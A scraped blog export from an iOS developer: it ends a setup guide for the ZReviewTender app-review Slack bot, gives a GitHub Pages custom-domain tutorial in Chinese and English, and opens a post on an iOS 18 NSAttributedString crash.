uses the latest official API to fetch review information, making it more accurate and stable compared to other services that rely on RSS to fetch reviews.Buy me coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli If this project has helped you, feel free to buy me a coffee. Thank you!Quick Start! 🚀 The entire setup process takes about 30 minutes, but you only need to set it up once. Unless the credentials change, it can run permanently for free and stably. 🚀🚀🚀🚀🚀Step 1. Create a Slack AppIf your organization already has a Slack App with permissions like chat:write, you can reuse it without creating a new one.Go to Slack Apps homepage:https://api.slack.com/appsClick “Create New App” in the top right corner. Choose: From scratch Enter App Name: ZReviewTender or a custom Slack App name Select the target Slack Workspace: Make sure you choose a Workspace where you have permission to add a Slack App. Create AppAdd OAuth &amp; Permissions Scopes: After creating the Slack app, go to the “OAuth &amp; Permissions” tab to set the Scopes. Select “OAuth &amp; Permissions” Scroll down to find the Scopes Section Sequentially add the three required Scopes for the ZReviewTender Slack App:chat:writechat:write.publiclinks:writeInstall App Return to the Install App tab to install the Slack App to your Workspace. Select “Install App” Click “Install to YOUR_WORKSPACE” Click “Allow”After installation, return to the Install App page where you will see the Slack App Bot User OAuth Token. Click “Copy” to copy it. Make a note of it for later use.Create a channel to receive review notifications: Sidebar -&gt; Channels -&gt; Create -&gt; Create channel Name: Enter your desired channel nameVisibility: Public: Open to everyone, no further action needed. Private: Private channel, ⭐️⭐️⭐️ you need to add the Slack App you just created:How to add the Slack App to the channel: Click on the channel name at the top Click “Settings” Click “Add an App” Search for the name of the Slack App you just created Click “Add”Once added successfully, the channel will display a message: ZReviewTender joined. ⭐️⭐️⭐️ I noticed a Slack bug here; the Slack App may not be searchable immediately after creation. It may take some time to appear; you can use a Public Channel in the meantime, which does not require adding the Slack App.Obtain Channel ID: The last and most important step is to obtain the Channel ID for later configuration. Click on the channel name at the top At the bottom of the About section, you will find the Channel ID information Make a note of the Channel ID for later use Slack steps completed.— — —Additional Notes:You can edit the Slack App name and icon in “Basic Information” -&gt; “Display Information”:After making changes, remember to click “Save Changes” in the bottom right corner to save.If you add new OAuth &amp; Permissions Scopes, you need to click “reinstall your app” for the changes to take effect:Step 2. Generate Apple App Store Connect API &amp; Google Play Android Developer API CredentialsApple App Store Connect API CredentialsiOS is relatively easier; we just need to obtain the following four pieces of information from App Store Connect:Issuer ID: App Store Connect -&gt; Keys -&gt; App Store Connect API Make a note of the Issuer ID for later use.Private Key ID &amp; Private Key:Click the “+” button to add: Name: ZReviewTender Access: App Manager Key ID Make a note of it for later use. Click “Download API Key” to save the downloaded file named AuthKey_XXXXXXXXXX.p8 for later use.App ID: (the target App ID for fetching reviews)You can find the App ID in App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; App ID. Make a note of the App ID for later use.Google Play Android Developer API CredentialsAndroid is more complex; you need to enable the API from the Google Cloud Project associated with the App, create a Service Account, and grant the Service Account access to the Google Play Console with permissions for the target App.Go to Google Cloud Project:Select the Google Cloud Project associated with the App or create a new Project.Enable “Android Developer API”: Search for “Android Developer API” and click to enter Select “Enable”[Optional Step] You can also enable “Cloud Translation API”: Enabling this allows you to use the same Service Account credentials for automatic review translation. Please note: The Cloud Translation API is not free; detecting languages and translations will incur costs! Please note: The Cloud Translation API is not free; detecting languages and translations will incur costs! Please note: The Cloud Translation API is not free; detecting languages and translations will incur costs!Create a Service Account: Search for “IAM” Select “IAM &amp; Admin” Select “Service Accounts” Choose “Create Service Account” Service Account Name: Enter a name, you can use “ ZReviewTender “ or “ Google Play Review Bot “ Service Account ID: This will auto-fill; no need to change unless necessary, this will also be your Service Account Email. Click “Done”Make a note of this Service Account’s email address: The list page will also display the Service Account Email address. Make a note of the Service Account Email for later use.Create a Service Account Key Credential: Refresh the list page and click on the Service Account you just created. Click “Add Key” Select “Create new key” Choose “JSON” as the key type. Click “Create” Save the downloaded file named XXXX-XXXX.json for later use.Add the Service Account to Google Play Console and grant permissions for the target App:Go to Google Play Console: Click “Users and permissions” Click “Invite new users” on the right Enter the Service Account Email you noted earlier in the Email address field. Under App permissions -&gt; Add app Add the target App for fetching reviews. Click “Invite user” to complete the invitation without verification.Obtain Google Play Console Developer ID, App ID, and Package Name information: Click on the target App to enter the Dashboard. Make a note of the Package Name for later use.Copy the Dashboard URL and find: The /developers/ XXX is your Developer ID. Make a note of this Developer ID for later use. In the /app/ XXX, this is your App ID. Make sure to note down this App ID, as you’ll need it for the setup later. Credential setup completed.Step 3. Deploying with Github Action and Filling in Configuration FilesThe exciting news is that I have packaged the tedious Github Repo and Github Action setup process into a Repo Template &amp; Marketplace Github Action. You can complete the work by following these simple steps.Go to: ZReviewTender-deploy-with-github-action:https://github.com/ZhgChgLi/ZReviewTender-deploy-with-github-action Repository name: Enter your desired Repo name. Private: Since the Repo will store access keys, make sure to set it as a Private Repo ⭐️⭐️⭐️. Private: Since the Repo will store access keys, make sure to set it as a Private Repo ⭐️⭐️⭐️. Private: Since the Repo will store access keys, make sure to set it as a Private Repo ⭐️⭐️⭐️. Click “Create repository”. The author and contributors of ZReviewTender, ZhgChgLi, are not responsible for any losses incurred from your use of ZReviewTender.Wait for the Repository to be created:Double-check that you have created a Private Repo: Private: Since the Repo will store access keys, make sure to set it as a Private Repo ⭐️⭐️⭐️. Private: Since the Repo will store access keys, make sure to set it as a Private Repo ⭐️⭐️⭐️. Private: Since the Repo will store access keys, make sure to set it as a Private Repo ⭐️⭐️⭐️.Enable Github Actions Permissions:After the Repo is created, due to Github’s security settings, you need to go to Repo Settings to allow Github Actions to run. Repo -&gt; Settings Select “Actions” -&gt; “General” For Actions permissions, select “Allow all actions and reusable workflows”. Click “Save”. For Workflow permissions, select “Read repository contents and packages permissions”.First Run, Initialize ZReviewTender: Repo -&gt; Actions Select “Init ZReviewTender”. Choose “Run workflow”. Click “Run workflow”. Refresh the page.Wait for the init ZReviewTender Action to complete: If you see ❌ Error: please double-check the Github Actions permissions settings mentioned earlier to ensure they are correct.If initialization is successful, you will see two new directories on the Repo homepage:Upload the required credential files: Enter the /config directory. Click “Add file” in the upper right corner -&gt; “Upload files”. Upload the GCP Service Account XXXX-XXXX.json (for Android) saved in Step 2 and the AuthKey_XXXXXXXXXX.p8 saved from App Store Connect (for iOS). Wait for the upload to complete. Select “Commit directly to the main branch”. Click “Commit changes”.Configure Apple (iOS): Enter the config/ directory and click on the apple.yml file. Click the “🖊️ Edit” button in the upper right corner.Edit apple.yml, paste the following content, and fill in the information you noted down in the previous steps:platform: 'apple'appStoreConnectP8PrivateKeyFilePath: './config/AuthKey_XXXXXXXXXX.p8' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: 'Private Key ID' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: 'Issuer ID' # APPLE STORE CONNECT ISSUE IDappID: 'App ID' # APP IDprocessors: - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack messages through Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack messages through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Coming WebHook URL, send slack messages through In-Coming WebHook, not recommended, deprecated. appStoreConnectP8PrivateKeyFilePath: Enter ./config/AuthKey_XXXXXXXXXX.p8 (the filename of the AuthKey_XXXXXXXXXX.p8 file saved in Step 2). appStoreConnectP8PrivateKeyID: The Private Key ID noted down from App Store Connect in Step 2. appStoreConnectIssueID: The Issuer ID noted down from App Store Connect in Step 2. appID: The App ID noted down from App Store Connect in Step 2. slackBotToken: Enter the Slack App Bot User OAuth Token noted down in Step 1. slackBotTargetChannel: Enter the Channel ID where you want to send messages noted down in Step 1. After editing, click “Commit changes…” in the upper right corner. Select “Commit directly to the main branch”. Click “Commit changes”.Configure Android: Enter the config/ directory and click on the android.yml file. Click the “🖊️ Edit” button in the upper right corner.Edit android.yml, paste the following content, and fill in the information you noted down in the previous steps:platform: 'android'packageName: 'Package Name' # Android App Package NamekeyFilePath: './config/XXXX-XXXX.json' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: 'Developer ID' # Google Console Developer Account IDplayConsoleAppID: 'App ID' # Google Console App IDprocessors:- SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack messages through Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack messages through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Coming WebHook URL, send slack messages through In-Coming WebHook, not recommended, deprecated. packageName: The Package Name noted down from the Google Play Console in Step 2. keyFilePath: Enter ./config/XXXX-XXXX.json (the filename of the XXXX-XXXX.json Service Account key file saved in Step 2). playConsoleDeveloperAccountID: The Developer ID noted down from the Google Play Console in Step 2. playConsoleAppID: The App ID noted down from the Google Play Console in Step 2. slackBotToken: Enter the Slack App Bot User OAuth Token noted down in Step 1. slackBotTargetChannel: Enter the Channel ID where you want to send messages noted down in Step 1. After editing, click “Commit changes…” in the upper right corner. Select “Commit directly to the main branch”. Click “Commit changes”. Setup completed! 🚀🚀🚀🚀Verify if the setup was successful:We can manually run it once to confirm that the setup is correct. Repo -&gt; Actions Select “ZReviewTender”. Choose “Run workflow”. Click “Run workflow”. Refresh the page.Wait for the ReviewTender Action to complete:Verification successful 🎉🎉🎉🎉 If you see ❌ Error or the Slack Channel did not receive the startup message: please double-check the contents of the configuration files to ensure they are correct.Completion 🎉🎉🎉Now you can rely on this free and reliable App review bot to keep track of the latest user reviews!Buy me coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli If this project has helped you, feel free to buy me a coffee. Thank you.Additional SettingsAdd Filtering FunctionalityOnly forward reviews that meet certain criteria. - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) You just need to add the FilterProcessor settings in the processors section of either /config/apple.yml or /config/android.yml.Add Automatic Translation FunctionalityAutomatically translate reviews in languages other than yours using the Google Cloud Translation API (this incurs costs). Make sure that the GCP Project associated with the Service Account created in Step 2 has the “Cloud Translation API” enabled. The settings for apple.yml and android.yml differ slightly.apple.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove the whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory that you don't want to translate. (territory for Apple e.g. TWN) ./config/XXXX-XXXX.json (the filename of the XXXX-XXXX.json Service Account key file saved in Step 2).android.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove the whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) ./config/XXXX-XXXX.json (the filename of the XXXX-XXXX.json Service Account key file saved in Step 2).Complete Combination Example:platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App IDprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove the whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack messages through Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack messages through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Coming WebHook URL, send slack messages through In-Coming WebHook, not recommended, deprecated.After adjustments, save the .yml as follows: After editing, click “Commit changes…”. Select “Commit directly to the main branch”. Click “Commit changes”.Execution Parameter SettingsYou can edit the ZReviewTender.yml file to set execution parameters. Repo -&gt; Actions. Click “ZReviewTender”. Click on the ZReviewTender.yml. Click the “🖊️ Edit” button in the upper right corner.name: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" # check new reviews every 6 hours.jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r'Adjust the Check Frequency (How often to fetch and forward new reviews?)Adjust the settings in cron: \"15 */6 * * *\".Parameters use Crontab notation; you can use this website to generate the desired settings:https://crontab.guru/Adjust the Execution ScriptAdjust the settings in command: \"-r\". -r: Run both Android and Apple (iOS) review checks simultaneously. -a: Run only Apple (iOS) review checks. -g: Run only Android review checks.After adjustments: After editing, click “Commit changes…”. Select “Commit directly to the main branch”. Click “Commit changes”.Temporarily Stop Checks Repo -&gt; Actions. Select “ZReviewTender”. Click the “…” on the right. Select “Disable workflow”.Report Issues and Suggest FeaturesIf you have any feature suggestions, questions, or bugs, please visit the above Github Repo to create an Issue report. Thank you.Advanced Usage and Development Stories ZReviewTender — A Free and Open Source App Reviews Monitoring Bot App Store Connect API Now Supports Reading and Managing Customer Reviews ZReviewsBot — Slack App Review Notification Bot The Story Behind AppStore APP’s Reviews Slack BotIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 232 Total Views Last Statistics Date: 2025-08-15 | 143 Views on Medium." }, { "title": "Github Pages 自訂網域教學", "url": "/posts/zrealm-dev/github-pages-%E8%87%AA%E8%A8%82%E7%B6%B2%E5%9F%9F%E6%95%99%E5%AD%B8-483af5d93297/", "categories": "ZRealm Dev.", "tags": "ios-app-development, github-pages, github, domain-names, namecheap", "date": "2024-09-22 17:14:16 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Github Pages 自訂網域教學使用你的網域替代原本的 github.io 網址關於 Github PagesGithub Pages 是由 Github 提供的免費靜態頁面寄存服務，所有 Github Free 帳號只...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Github Pages 自訂網域教學使用你的網域替代原本的 github.io 網址關於 Github PagesGithub Pages 是由 Github 提供的免費靜態頁面寄存服務，所有 Github Free 帳號只要是 Public Repo 都能直接使用，如果是 Private Repo 則須先付費升級 Github 帳號。ZhgChgLi ZhgChgLi iOS Developer 求知若渴 教學相長 更愛電影/美劇/西音/運動/生活 zhgchg.li 我使用 Github Pages 部署的 Jekyll Blog 無痛轉移 Medium 到 Github Pages ➡️➡️➡️限制 只能寄存靜態檔案資源： HTML, CSS, JavaScript, 字體檔案, 圖片檔案, PDF, 音訊檔案, 文字檔案…等等 網站(Repo)大小不得超過： 1 GB這猜測也是軟限制，因為我的 Github Pages Jekyll Repo 已經快 5 GB 了。 部署工作時間最長： 10 分鐘 每小時最多部署： 10 次 (軟限制) 每月流量限制 ：100 GB (軟限制) 請求過於頻繁可能會響應 HTTP 429 ⭐️⭐️⭐️若只想了解 Github Pages 自訂網域教學 請繼續往下閱讀。Github Pages 教學，搭配 ChatGPT 不會程式也能打造個人網站以下以程式小白、不會 Git 為範例。1.註冊、登入 Github： https://github.com/ 登入 Github 後選擇右上角「+」-&gt;「New repository」2. 輸入 Repo 名稱、設定 Repository name： 輸入你的帳號.github.io Public：公開的專案 Add a README file：方便建立後可直接使用 Github Web 新增檔案 Create repositoryRespository name 的部分每個帳號或組織(Organization) 只能建立一個 你的帳號.github.io 的主 Github Pages Repo，其他 Repo 若也想要部署到 Github Pages 網址會是 你的帳號.github.io/Reop名稱 ，例如： 你的帳號/你的帳號.github.io Repo -&gt; 你的帳號.github.io 你的帳號/mywebdemo Repo -&gt; 你的帳號.github.io/mywebdemo如為非 你的帳號.github.io 的主 Github Pages Repo，需要再去 Settings 設定 Pages 才能啟用 GitHub Pages：例如我的 Repo zhgchgli0718/testgithubpage 也想有 Github Pages 頁面。 Settings -&gt; Pages -&gt; Branch -&gt; 選擇 main/root -&gt; Save 完成3. 建立你的首頁 .html 檔案 在 Repo 首頁點擊右上角綠色按鈕「Code」 選擇「+ Create new file」4. 使用 ChatGPT 協助您產生頁面 .html 檔案 這邊用最簡單的 Prompt： 產生一個賽博龐克風的 歡迎頁面 (.html)5. 貼上 .html 回 Github Repo File 檔案名稱：輸入 index.html Edit：貼上 ChatGPT 產生的 .html 內容，可以使用 ChatGPT 調整你要的 html 或是直接在這邊編輯 HTML 內容 點右上角「Commit changes…」 選擇「Commit directly to the main branch」—上傳資源檔案(例如：圖片)： 一樣點擊「Add file」選擇「Upload files」 拖曳或選擇檔案，等待上傳完成 點擊「Commit changes」 完成6. 等待部署如同前述，Github Pages 需要部署，不是存檔就會出現；我們可以點 Repo 上方的「Actions」查看部署進度，直到橘燈🟠變成綠色勾勾✅代表部署完成了。7. 查看成果https://zhgchgli0718.github.io/ 前往： https://你的帳號.github.io 查看成果Github Pages 自訂網域教學再來才是本篇重點，Github Page 自訂網域，如前述，預設我們只能使用 你的帳號.github.io 做為你的靜態網站主網域；如果是其他 Repo 還只能透過 /路徑 訪問，沒辦法創造第二個 *.github.io 。但 Github Pages 佛心的事是提供自訂網域功能。 ⭐️⭐️⭐️ 購買的網域同時也能用在： Medium 自訂網域功能。 例如我的網域： 1. https://zhgchg.li -&gt; 用在 Github Pages Jekyll Blog 2. https://blog.zhgchg.li -&gt; 用在我的 Medium 頁面1. 購買＆取得域名 by Namecheap (老牌網域大廠)首先到 Namecheap 官網首頁 搜尋喜歡的域名：得到搜尋結果：右邊按鈕顯示「 Add To Cart 」代表該域名還沒有人註冊，可以加入購物車購買。如果右邊按鈕顯示「 Make offer 」、「 Taken 」代表該域名已被註冊，請選擇其他後綴或換個域名：加入購物車後點擊下方「 Checkout 」。進入訂單確認頁： Domain Registration ：這邊可以選擇 AUTO-RENEW 每年自動續費，也可以改要一次購買的年數。 WhoisGuard ：由於 網域資料可以公開讓任何人自由查詢 （註冊時間、到期日、註冊人、聯繫方式）；此功能可以將註冊人及聯繫方式改為顯示 Namecheap，而非直接顯示你的個人資料，可以防止垃圾郵件訊息。（此功能部分後綴是要收費的，如果是免費的話就用吧！）擷取一些 google.com 的 whois 訊息結果，可 由此查詢 。 PremiumDNS ：我們知道域名等於門牌，也就是說看到門牌會去找位置在哪；這個功能就是提供更穩定安全的「找位置在哪」功能，我是覺得不必，除非是一點錯誤都不能出的高流量電商網站之類。輸入完信用卡資訊點「 Confirm Order 」之後就購買成功囉！會收到一封訂單明細信件。2. 網域設定by Namecheap前往 Account -&gt; Dashboard:找到你要設定的網域 -&gt; 右邊點擊「Manage」:確定 Domain -&gt; NAMESERVERS -&gt; 選擇「Namecheap BasicDNS」：切換到「Advanced DNS」-&gt; 加入 A Record： 點擊「ADD NEW RECORD」 Type 選擇「A Record」 Host 輸入「 @ 」 Value 依序輸入：185.199.108.153185.199.109.153185.199.110.153185.199.111.153四筆紀錄。 每一筆輸入完就點「✔️」儲存設定。 完成。3. 依照想設定的 Github Pages Repo 加入 CNAME Record： 點擊「ADD NEW RECORD」 Type 選擇「CNAME Record」 Host 輸入，看你希望的 subdomain，如果希望是一級網域則輸入「 www 」 Value 輸入： 你的帳號.github.io4. 回到 Github Repo 設定 Github Repo -&gt; Settings -&gt; Pages Custom domain：輸入 你的網域 (若為 www. 可省略) 點擊 Save 可以勾選強制使用 HTTPS 增加訪問安全性。等待 DNS Check… 通常在五分鐘內能確認，但依照 DNS 機制最長可能需要 72 小時設定才會生效， 如果確定步驟沒錯但一直確認失敗不妨過幾天再回來試試。設定成功！前往你的網域驗證結果：成功！🎉🎉🎉 現在我們不用在使用舊的 https://你的帳號.github.io 訪問你的 Github Pages，可以直接使用 https://你的網域 進行訪問囉！ 其他 Repo 的 Github Pages 也可以透過 https://你的網域/Repo 名稱 進行訪問。其他文章Medium 自訂網域Medium 自訂網域無痛轉移 Medium 到 Github Pages無痛轉移 Medium 到 Github Pages有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,699 Total Views Last Statistics Date: 2025-08-15 | 2,653 Views on Medium." }, { "title": "Guide to Custom Domains on GitHub Pages", "url": "/posts/zrealm-dev/en/guide-to-custom-domains-on-github-pages-483af5d93297/", "categories": "ZRealm Dev.", "tags": "ios-app-development, github-pages, github, domain-names, namecheap", "date": "2024-09-22 17:14:16 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Guide to Custom Domains on GitHub PagesUse your own domain instead of the default gi...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Guide to Custom Domains on GitHub PagesUse your own domain instead of the default github.io URL.About GitHub PagesGitHub Pages is a free static site hosting service provided by GitHub. All GitHub Free accounts can use it for public repositories directly, while private repositories require a paid upgrade to a GitHub account.ZhgChgLi ZhgChgLi iOS Developer, eager to learn, teaching and sharing, loves movies/TV shows/western music/sports/life zhgchg.li My Jekyll Blog deployed on GitHub Pages Seamless transfer from Medium to GitHub Pages ➡️➡️➡️Limitations Only static file resources can be hosted: HTML, CSS, JavaScript, font files, images, PDFs, audio files, text files, etc. Website (Repo) size must not exceed: 1 GBThis is likely a soft limit, as my GitHub Pages Jekyll Repo is nearly 5 GB. Maximum deployment time: 10 minutes Maximum deployments per hour: 10 (soft limit) Monthly bandwidth limit: 100 GB (soft limit) Frequent requests may result in an HTTP 429 response. ⭐️⭐️⭐️ If you only want to learn about custom domains on GitHub Pages, please continue reading.GitHub Pages Tutorial: Create Your Personal Website with ChatGPT, No Coding RequiredThis section is aimed at beginners who are not familiar with Git.1. Register and log in to GitHub: https://github.com/ After logging in to GitHub, click the “+” icon in the upper right corner and select “New repository.”2. Enter Repo Name and Settings Repository name: yourusername.github.io Public: Select for a public project Add a README file: This makes it easier to add files directly using GitHub Web after creation. Create repository.Each account or organization can only create one main GitHub Pages Repo named yourusername.github.io. Other Repos that you want to deploy to GitHub Pages will be accessed via yourusername.github.io/RepoName. For example: yourusername/yourusername.github.io Repo → yourusername.github.io yourusername/mywebdemo Repo → yourusername.github.io/mywebdemoFor Repos that are not yourusername.github.io, you need to go to Settings to enable GitHub Pages:For example, if I want my Repo zhgchgli0718/testgithubpage to have a GitHub Pages page: Settings → Pages → Branch → Select main/root → Save Done.3. Create Your Homepage .html File On the Repo homepage, click the green “Code” button in the upper right corner. Select “+ Create new file.”4. Use ChatGPT to Generate Your .html Page Here’s a simple prompt: Generate a cyberpunk-themed welcome page (.html).5. Paste the .html into Your GitHub Repo File File name: Enter index.html Edit: Paste the .html content generated by ChatGPT. You can use ChatGPT to adjust your HTML or edit the HTML content directly here. Click the “Commit changes…” button in the upper right corner. Select “Commit directly to the main branch.”Upload Resource Files (e.g., images): Click “Add file” and select “Upload files.” Drag and drop or select files, wait for the upload to complete. Click “Commit changes.” Done.6. Wait for DeploymentAs mentioned earlier, GitHub Pages requires deployment; simply saving won’t make it appear. You can click on “Actions” at the top of the Repo to check the deployment progress until the orange light 🟠 turns into a green checkmark ✅, indicating that deployment is complete.7. View the Resultshttps://zhgchgli0718.github.io/ Go to: https://yourusername.github.io to see the results.Guide to Custom Domains on GitHub PagesNow we get to the main point of this article: custom domains on GitHub Pages. As mentioned earlier, by default, we can only use yourusername.github.io as the main domain for your static website. For other Repos, you can only access them via /path, and you cannot create a second *.github.io.However, GitHub Pages generously offers a custom domain feature. ⭐️⭐️⭐️ The purchased domain can also be used for: Medium Custom Domain Feature. For example, my domains: 1. https://zhgchg.li → Used for my GitHub Pages Jekyll Blog 2. https://blog.zhgchg.li → Used for my Medium page1. Purchase &amp; Obtain a Domain from Namecheap (A well-known domain provider)First, go to the Namecheap homepage and search for your desired domain:You will receive search results:If the button on the right shows “ Add To Cart “, it means the domain is available for registration, and you can add it to your cart for purchase.If the button shows “ Make offer “ or “ Taken “, it means the domain has already been registered, and you should choose another suffix or a different domain:After adding to the cart, click the “ Checkout “ button below.You will enter the order confirmation page: Domain Registration: Here you can choose AUTO-RENEW for automatic renewal each year or change the number of years for a one-time purchase. WhoisGuard: Since domain information can be publicly queried by anyone (registration date, expiration date, registrant, contact information), this feature allows you to display Namecheap instead of your personal information to prevent spam messages.(This feature may incur a fee for some suffixes, but if it’s free, go ahead and use it!)You can check some whois information results for google.com here. PremiumDNS: A domain name is like an address; seeing the address helps locate the place. This feature provides a more stable and secure “location finding” service. I think it’s unnecessary unless you’re running a high-traffic e-commerce site where even a slight error cannot occur.After entering your credit card information, click “ Confirm Order “.You will successfully purchase the domain!You will receive an order confirmation email.2. Domain Settings via NamecheapGo to Account → Dashboard:Find the domain you want to set up → Click “Manage” on the right:Ensure Domain → NAMESERVERS → Select “Namecheap BasicDNS”:Switch to “Advanced DNS” → Add A Record: Click “ADD NEW RECORD.” Select “A Record” for Type. Enter “ @ “ for Host. Enter the following values:185.199.108.153185.199.109.153185.199.110.153185.199.111.153Four records in total. After entering each record, click “✔️” to save the settings. Done.3. Add CNAME Record Based on Your Desired GitHub Pages Repo: Click “ADD NEW RECORD.” Select “CNAME Record” for Type. Enter your desired subdomain for Host; if you want a primary domain, enter “ www “. Enter the Value: yourusername.github.io4. Go Back to GitHub Repo Settings GitHub Repo → Settings → Pages Custom domain: Enter yourdomain (omit www. if applicable). Click Save. You can check the box to enforce HTTPS for added security.Wait for DNS Check… Typically, confirmation can be completed within five minutes, but due to DNS mechanisms, it may take up to 72 hours for the settings to take effect. If you are sure the steps are correct but confirmation keeps failing, try again in a few days.Setup Successful!Go to your domain to verify the results:Success! 🎉🎉🎉 Now we no longer need to use the old https://yourusername.github.io to access your GitHub Pages; we can directly use https://yourdomain for access! Other Repos’ GitHub Pages can also be accessed via https://yourdomain/RepoName.Other ArticlesMedium Custom DomainMedium Custom DomainSeamless Transfer from Medium to GitHub PagesSeamless Transfer from Medium to GitHub PagesIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 2,699 Total Views Last Statistics Date: 2025-08-15 | 2,653 Views on Medium." }, { "title": "iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變", "url": "/posts/zrealm-dev/ios-18-nsattributedstring-attributes-range-%E5%90%88%E4%BD%B5%E7%9A%84%E4%B8%80%E5%80%8B%E8%A1%8C%E7%82%BA%E6%94%B9%E8%AE%8A-9e43897d99fc/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, ios-18, ios, swift", "date": "2024-09-20 21:03:42 +0800", "snippet": "iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變iOS ≥ 18 開始 NSAttributedString attributes Range 合併會參考 EquatablePhoto by C M問題起因iOS 18 2024/9/17 上線後，之前做的開源專案 ZMarkupParser 就有開發者回報 iOS 18 在解析部分...", "content": "iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變iOS ≥ 18 開始 NSAttributedString attributes Range 合併會參考 EquatablePhoto by C M問題起因iOS 18 2024/9/17 上線後，之前做的開源專案 ZMarkupParser 就有開發者回報 iOS 18 在解析部分 HTML 時會發生閃退。看到這個 Issue 有點困惑，因為程式在以前都沒問題，iOS 18 開始才會閃退，不符合常理，應該是 iOS 18 底層 Foundation 有什麼調整導致。Crash TraceTrace Code 後定位到閃退問題點是遍歷 .breaklinePlaceholder Attributes 並針對 Range 進行刪除操作時會發生閃退:mutableAttributedString.enumerateAttribute(.breaklinePlaceholder, in: NSMakeRange(0, NSMakeRange(0, mutableAttributedString.string.utf16.count))) { value, range, _ in // ...if condition... // mutableAttributedString.deleteCharacters(in: preRange) // ...if condition... // mutableAttributedString.deleteCharacters(in: range)}.breaklinePlaceholder 是我自行擴充的一個 NSAttributedString.Key，用來標記 HTML 標籤資訊，優化換行符號使用:struct BreaklinePlaceholder: OptionSet { let rawValue: Int static let tagBoundaryPrefix = BreaklinePlaceholder(rawValue: 1) static let tagBoundarySuffix = BreaklinePlaceholder(rawValue: 2) static let breaklineTag = BreaklinePlaceholder(rawValue: 3)}extension NSAttributedString.Key { static let breaklinePlaceholder: NSAttributedString.Key = .init(\"breaklinePlaceholder\")} 但核心問題不是這裡 ，因為在 iOS 17 以前，輸入的 